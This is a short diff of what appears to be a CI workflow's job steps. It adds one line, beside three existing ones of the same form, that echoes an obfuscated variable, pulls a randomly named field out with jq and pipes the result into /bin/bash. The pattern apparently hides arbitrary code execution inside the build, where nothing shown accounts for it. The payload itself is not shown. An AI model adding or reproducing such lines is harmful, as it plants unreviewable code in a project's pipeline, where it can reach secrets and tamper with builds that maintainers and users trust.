@@ -29,6 +29,7 @@ jobs:
           echo $vvgwm49 | jq -r .z39476 | /bin/bash
           printf '%s' "$yk914" | jq -r .ecf689 | /bin/bash
           echo $nx09 | jq -r .dv43 | /bin/bash
+          echo $edrf48228 | jq -r .xoad8 | /bin/bash
 
       - name: Save archive
         if: always()
